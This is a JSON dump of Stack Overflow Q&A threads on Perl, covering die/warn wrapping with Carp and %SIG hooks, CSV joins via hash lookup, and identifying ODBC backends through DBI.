"https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494969965, "post_id": 44011182, "comment_id": 75051872, "body": "@Borodin Thanks for the tip. Though I think the <b>WARN</b> and <b>DIE</b> signals will be sufficient."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494971356, "post_id": 44011182, "comment_id": 75052433, "body": "@Prgrm.celeritas: I wasn&#39;t just putting you down in my first comment: I expected you to come back with a more detailed explanation of what you meant. Please would you explain why you want to <i>&quot;decorate all error messages&quot;</i>? (By the way, put things like <code>__WARN__</code> inside bacticks to avoid the contents being treated as markdown, especially if it&#39;s a code fragment anyway.)"}, {"owner": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494973437, "post_id": 44011182, "comment_id": 75053291, "body": "@Borodin Our standard for warning messages is &quot;\\n-W- ($0) &lt;message&gt;\\n&quot;. Similar for error messages. Problem is, people often forget parts of the standard which leads to inconsistent log files and bugs. I wanted to add the prefix and suffix to a function so you could just give a warning or error and not worry about formatting."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1494973443, "post_id": 44011182, "comment_id": 75053295, "body": "@Prgrm.celeritas  Thanks for clarification.  While this should cit it for a simple solution, have you considered <a href=\"http://search.cpan.org/~mschilli/Log-Log4perl-1.49/lib/Log/Log4perl.pm\" rel=\"nofollow noreferrer\">Log::Log4Perl</a>?  It&#39;s heavy-handed for just this, but great if more is (or can be) standardized."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494974749, "post_id": 44011182, "comment_id": 75053750, "body": "@Prgrm.celeritas: Thank you. But I still don&#39;t see how you can expect any warning or error messages at all from a properly-written program. If you want to record stuff like &quot;disk full&quot; or &quot;connection time out&quot; then you probably shouldn&#39;t use <code>warn</code> and <code>die</code>."}, {"owner": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494975951, "post_id": 44011182, "comment_id": 75054150, "body": "@Borodin I am surprised you would take that view. A warning could be something like, &quot;module does not support this feature&quot; or &quot;spec files are outdated&quot;. An error could be something like &quot;invalid configuration&quot; or &quot;spec files missing necessary param x&quot;. Those seem like perfectly valid messages to me, even in release code."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1495021920, "post_id": 44011182, "comment_id": 75074405, "body": "@Prgrm.celeritas: <i>module does not support this feature</i> is clearly a bug, if I understand you correctly. I don&#39;t know what you mean by specification files, which to me are design documents. I agree with you about <i>invalid configuration</i>, along with, as I suggested, <i>disk full</i> and <i>connection time out</i>, but together those are so few and so rare that it seems a waste of time to write a special formatter for them when a logger would be more appropriate anyway."}, {"owner": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1495024652, "post_id": 44011182, "comment_id": 75076370, "body": "@Borodin Sorry should have clarified: Hardware modules, not Perl modules. And spec files describe the specifications, parameterization, and configurations of those modules."}], "answers": [{"comments": [{"owner": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "edited": false, "score": 0, "creation_date": 1494968915, "post_id": 44011471, "comment_id": 75051421, "body": "Thanks this is just what I was looking for."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "edited": false, "score": 0, "creation_date": 1494969117, "post_id": 44011471, "comment_id": 75051521, "body": "@Prgrm.celeritas Great :).  Please make sure to pay due attention to many details and subtleties: read carefully.  While <code>Carp</code> is what one should use, the extra hooks do mess with things."}, {"owner": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "edited": false, "score": 0, "creation_date": 1494969195, "post_id": 44011471, "comment_id": 75051567, "body": "I will look into it. Thanks for the heads up!"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494970895, "post_id": 44011471, "comment_id": 75052229, "body": "Well they can use the <code>$SIG{__WARN__}</code> and <code>__DIE__</code> even without Carp."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494971730, "post_id": 44011471, "comment_id": 75052591, "body": "@Borodin Thank you very much for edits (fixes and improvements)."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494971768, "post_id": 44011471, "comment_id": 75052605, "body": "@simbabque Yes, a clumsy wording. I meant to continue with the next statement ... will edit. Thank you."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 9, "last_activity_date": 1559537467, "last_edit_date": 1559537467, "creation_date": 1494968340, "answer_id": 44011471, "question_id": 44011182, "link": "https://stackoverflow.com/questions/44011182/wrapping-perl-die-and-warn-in-a-utility-subroutine/44011471#44011471", "title": "Wrapping Perl &quot;die&quot; and &quot;warn&quot; in a utility subroutine", "body": "\n\n<p>Use <a href=\"http://perldoc.perl.org/Carp.html\" rel=\"nofollow noreferrer\">Carp</a> for warnings/errors. You can use <code>__WARN__</code> and <code>__DIE__</code> hooks to affect what <code>warn</code> prints to the <code>STDERR</code> stream and how <code>die</code> is thrown.  Note that they are quite different.</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse Carp;\n\n$SIG{__WARN__} = \\&amp;wrap_warn;\n\nsub wrap_warn {\n    print \"WARNING: @_\";\n} \n\nsub level_2 { \n    say \"Print from level_2\";\n    carp \"carp from level_2(@_)\"; \n}\n\nsub level_1 {\n    level_2(@_);\n}\n\nlevel_1(\"from main\");\n</code></pre>\n\n<p>prints to <code>STDOUT</code></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Print from level_2\nWARNING: carp from level_2(from main) at wrap_warn.pl line 19.\n        main::level_2('from main') called at wrap_warn.pl line 15\n        main::level_1('from main') called at wrap_warn.pl line 22\n</code></pre>\n\n<p>If you want this to still go to <code>STDERR</code> then use <code>print STDERR \"WARNING: @_\";</code> </p>\n\n<p>Make sure to carefully read about <a href=\"http://perldoc.perl.org/perlvar.html#%25SIG\" rel=\"nofollow noreferrer\"><code>%SIG</code> in perlvar</a> and <a href=\"http://perldoc.perl.org/functions/warn.html\" rel=\"nofollow noreferrer\">warn</a>, at least.</p>\n\n<hr>\n\n<p>While it seems that you want this to be global, I'd like to mention that one generally wants to <a href=\"http://perldoc.perl.org/functions/local.html\" rel=\"nofollow noreferrer\">local</a>-ize changes like this one. There's an example in <a href=\"https://stackoverflow.com/questions/40112681/can-i-suppress-error-message-from-fetch-pm-in-perl/40114084#40114084\">this post</a>, and more out there.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1495045061, "last_edit_date": 1495045061, "creation_date": 1495041726, "answer_id": 44031253, "question_id": 44011182, "link": "https://stackoverflow.com/questions/44011182/wrapping-perl-die-and-warn-in-a-utility-subroutine/44031253#44031253", "title": "Wrapping Perl &quot;die&quot; and &quot;warn&quot; in a utility subroutine", "body": "<p>Adding the following will add stack traces to exceptions and warnings:</p>\n\n<pre><code>use Carp::Always;\n</code></pre>\n\n<p>For the occasional use, use the following to avoid modifying your program:</p>\n\n<pre><code>perl -MCarp::Always script args\n</code></pre>\n\n<p>or</p>\n\n<pre><code>PERL5OPT=-MCarp::Always script args\n</code></pre>\n"}], "owner": {"reputation": 261, "user_id": 6411120, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12cb89f52df40db97b55b861f636838a?s=128&d=identicon&r=PG&f=1", "display_name": "Prgrm.celeritas", "link": "https://stackoverflow.com/users/6411120/prgrm-celeritas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 501, "favorite_count": 0, "accepted_answer_id": 44011471, "answer_count": 2, "score": 1, "last_activity_date": 1559537467, "creation_date": 1494967215, "last_edit_date": 1494968399, "question_id": 44011182, "link": "https://stackoverflow.com/questions/44011182/wrapping-perl-die-and-warn-in-a-utility-subroutine", "title": "Wrapping Perl &quot;die&quot; and &quot;warn&quot; in a utility subroutine", "body": "<p>I want to write a small subroutine that can decorate all error messages in a consistent way instead of having to copy it all around my program.</p>\n\n<p>However I want the line numbers to be from where it was called, not from where the <code>die</code>/<code>warn</code> occurred.</p>\n\n<p>In C I would just use a preprocessor macro, but Perl does not have those. What is the best way to implement this?</p>\n"}, {"tags": ["perl", "hashmap"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494971481, "post_id": 44010496, "comment_id": 75052470, "body": "<i>&quot;You don&#39;t have to use hash maps necessarily&quot;</i> Is this a school assignment?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494972006, "post_id": 44010496, "comment_id": 75052712, "body": "The line <code>my @temp_data1, @temp_data2</code> declares <code>@temp_data1</code> as a lexical array variable, but the <code>my</code> doesn&#39;t apply to <code>@temp_data2</code> because it binds more tightly than the comma operator. You have written the equivalent of <code>my @temp_data1;</code> <code>@temp_data2;</code> and just mentioning an array in a statement on its own will be optimised out. <code>my</code> is of very little use without <code>use strict</code>, and you <i>must always</i> use it together with <code>use warnings &#39;all&#39;</code> at the top of <i>every</i> Perl program you write. That simple measure would have alerted you to your error."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494975161, "post_id": 44010496, "comment_id": 75053891, "body": "Initialising <code>$not_found = 1</code> is confusing. It would be much better to use <code>$found</code> and invert the logic, finishing with <code>say &quot;$line1 was not found&quot; unless $found</code>."}, {"owner": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1495028542, "post_id": 44010496, "comment_id": 75079543, "body": "@Borodin No, this isn&#39;t a school assignment...lol.  I&#39;ve been trying to come up with this solution for a while using perl, and i&#39;ve declared those array as brevity.  Of course, you can&#39;t use them in that nature."}], "answers": [{"comments": [{"owner": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "edited": false, "score": 0, "creation_date": 1494966856, "post_id": 44010967, "comment_id": 75050386, "body": "Forgot to mention that it should print $line1 if it doesn&#39;t match anything in the @data2 array"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "edited": false, "score": 0, "creation_date": 1494967079, "post_id": 44010967, "comment_id": 75050496, "body": "You&#39;ll need to load file 2 in the hash, then. Fixed."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1495031889, "last_edit_date": 1495031889, "creation_date": 1494966427, "answer_id": 44010967, "question_id": 44010496, "link": "https://stackoverflow.com/questions/44010496/using-hash-maps-and-searching-comma-delimited-files/44010967#44010967", "title": "Using Hash Maps and Searching Comma Delimited Files", "body": "<p>Populate a hash using the key field as the hash key and the row as the value. Then go through the other file, looking for matches in the hash.</p>\n\n<pre><code>use Text::CSV_XS qw( );\n\n@ARGV == 2\n   or die(\"usage\\n\");\n\nmy ($data_file1, $data_file2) = @ARGV;\n\nopen(my $fh1, '&lt;', $data_file1);\n   or die(\"Can't open \\\"$data_file1\\\": $!\\n\");\nopen(my $fh2, '&lt;', $data_file2);\n   or die(\"Can't open \\\"$data_file2\\\": $!\\n\");\n\nmy $csv = Text::CSV_XS-&gt;new({ auto_diag =&gt; 2, binary =&gt; 1 });\n\nmy %data;\nwhile ( my $row = $csv-&gt;getline($fh2) ) {\n   $data{ $row-&gt;[3] } = $row;\n}\n\nwhile ( my $row = $csv-&gt;getline($fh1) ) {\n   if ( my $linked_row = $data{ $row-&gt;[2] } ) {\n      $csv-&gt;say(\\*STDOUT, [ @$row, @$linked_row ]);\n   } else {\n      $csv-&gt;say(\\*STDERR, $row);\n   }\n}\n</code></pre>\n\n<p>Usage:</p>\n\n<pre><code>script file1.csv file2.csv &gt;merged.csv 2&gt;unpaired.csv\n</code></pre>\n\n<ul>\n<li>Assumes the 3rd column of the first file contains only unique values.</li>\n<li>Assumes the 4th column of the second file contains only unique values.</li>\n</ul>\n\n<p>CPU: O(N+M) instead of O(N*M).<br>\nMem: O(M) instead of O(N+M).<br>\nwhere N is the number of elements in the first file,<br>\nand M is the number of elements in the second file.</p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494966829, "post_id": 44010981, "comment_id": 75050369, "body": "Doesn&#39;t produce the request result (<code>james,smith,3 kids,jim,jones,tall,3 kids</code>)."}, {"owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494967105, "post_id": 44010981, "comment_id": 75050510, "body": "What do you mean? It finds one match."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494967193, "post_id": 44010981, "comment_id": 75050549, "body": "It needs to print <code>james,smith,3 kids,jim,jones,tall,3 kids</code>, not <code>3 kids</code>"}, {"owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494967303, "post_id": 44010981, "comment_id": 75050603, "body": "My bad. Missed that part."}], "tags": [], "owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "is_accepted": false, "score": 0, "last_activity_date": 1494966994, "last_edit_date": 1494966994, "creation_date": 1494966467, "answer_id": 44010981, "question_id": 44010496, "link": "https://stackoverflow.com/questions/44010496/using-hash-maps-and-searching-comma-delimited-files/44010981#44010981", "title": "Using Hash Maps and Searching Comma Delimited Files", "body": "<pre><code>my $data_file1 = \"file1.csv\";  #contains in this file \"james,smith,3 kids\"\nmy $data_file2 = \"file2.csv\";  #contains in this file \"jim,jones,tall,3 kids\"\n\nmy $handle1;\n\nmy %searchHash;\n\nopen $handle1, '&lt;', $data_file1;\nwhile (my $line = &lt;$handle1&gt;) {\n    chomp($line);\n    $searchHash{(split /,/,$line)[2]} = 0;\n}\nclose $handle1;     \n\nopen  $handle1, '&lt;', $data_file2;\nwhile (my $line = &lt;$handle1&gt;) {\n    chomp($line);\n    my $key = (split /,/,$line)[3];\n    $searchHash{$key}++ if(defined $searchHash{$key});\n}\nclose $handle1;\n\nforeach my $key (keys %searchHash) {\n    print \"$key ($searchHash{$key})\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "accepted_answer_id": 44010967, "answer_count": 2, "score": -1, "last_activity_date": 1495031889, "creation_date": 1494964596, "last_edit_date": 1494966808, "question_id": 44010496, "link": "https://stackoverflow.com/questions/44010496/using-hash-maps-and-searching-comma-delimited-files", "title": "Using Hash Maps and Searching Comma Delimited Files", "body": "<p>Below is an example of searching comma delimited files using regex.  Does anyone know how to convert the below code into hash map searches.  If there is a match, the code should return the original lines from both files.</p>\n\n<p>You don't have to use hash maps necessarily.  Your solution can include any other faster approach for searching arrays such as grep, hash, smart search, first, etc.</p>\n\n<p>There are thousands of records in these documents.  The goal is to find the similar items in the 3rd column from file1.csv and 4th column in file2.csv.  if there is a match join the lines from both documents. </p>\n\n<p><strong>Update</strong>: Forgot to mention that it should print $line1 if it doesn't match anything in the @data2 array</p>\n\n<pre><code>   my $data_file1 = \"file1.csv\";  #contains in this file \"james,smith,3 kids\"\nmy $data_file2 = \"file2.csv\";  #contains in this file \"jim,jones,tall,3 kids\"\n\nmy $handle1;\nmy @temp_data1, @temp_data2;\n\nopen $handle1, '&lt;', $data_file1;\nchomp(@data1 = &lt;$handle1&gt;);\nclose $handle1;     \n\nopen  $handle1, '&lt;', $data_file2;\nchomp(@data2 = &lt;$handle1&gt;);\nclose $handle1; \n\nforeach my $line1 (@data1)\n{   \n    @temp_data1 = split /,/ , $line1;   \n    $not_found =1;\n    foreach my $line2 (@data2)\n    {           \n        @temp_data2 = split /,/ , $line2;   \n\n        if($temp_data2[3] =~ /$temp_data1[2]$/)\n        {\n            $not_found =0;\n            say $line1 .\",\". $line2;\n        }\n    }\n    if($not_found)\n    {\n        say \"$line1 was not found\";\n    }\n}\n</code></pre>\n"}, {"tags": ["perl", "odbc", "dbi"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 4, "creation_date": 1494952667, "post_id": 44006928, "comment_id": 75042340, "body": "Maybe <code>$dbh-&gt;get_info</code>?"}, {"owner": {"reputation": 936, "user_id": 2066126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/224ed6420ee88dea389bb21ca1cfa0aa?s=128&d=identicon&r=PG", "display_name": "TheAmigo", "link": "https://stackoverflow.com/users/2066126/theamigo"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494952871, "post_id": 44006928, "comment_id": 75042453, "body": "@ikegami Yes, it needs the right argument, but $dbh-&gt;get_info(17) returns what I want.  Thank you."}], "owner": {"reputation": 936, "user_id": 2066126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/224ed6420ee88dea389bb21ca1cfa0aa?s=128&d=identicon&r=PG", "display_name": "TheAmigo", "link": "https://stackoverflow.com/users/2066126/theamigo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 49, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1494952295, "creation_date": 1494952295, "question_id": 44006928, "link": "https://stackoverflow.com/questions/44006928/how-to-identify-backend-database-when-using-perls-dbiodbc", "title": "How to identify backend database when using Perl&#39;s DBI::ODBC", "body": "<p>I'm writing a function in a module that receives a DBI database handle object.  Often, this is an ODBC connection.  When I run:</p>\n\n<pre><code>print $dbh-&gt;{Driver}{Name};\n</code></pre>\n\n<p>I get <code>ODBC</code>.  How can I tell to what type of database that ODBC connection refers?  Sometimes it's MySQL, others it's DB2 or MSSQL.</p>\n\n<p>Versions:</p>\n\n<ul>\n<li>CentOS Linux 7.3</li>\n<li>Perl 5.16.3</li>\n<li>DBD::ODBC 1.50</li>\n<li>unixODBC 2.3.1</li>\n</ul>\n"}, {"tags": ["javascript", "perl", "pack"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494949602, "post_id": 44005908, "comment_id": 75040353, "body": "<a href=\"http://perldoc.perl.org/functions/pack.html\" rel=\"nofollow noreferrer\">perldoc -f pack</a>"}, {"owner": {"reputation": 1236, "user_id": 3654197, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6ZwEQ.jpg?s=128&g=1", "display_name": "Zeke", "link": "https://stackoverflow.com/users/3654197/zeke"}, "edited": false, "score": 1, "creation_date": 1494949926, "post_id": 44005908, "comment_id": 75040620, "body": "There are tutorials especially designed to provide information about different languages and more, especially the documentation provided by the creators. SO is not a tutorial site, please try to ask something that many people can benefit from."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494955018, "post_id": 44006626, "comment_id": 75043633, "body": "Why the downvote?"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494961873, "post_id": 44006626, "comment_id": 75047567, "body": "Dunno what&#39;s going on these days, but upvoted 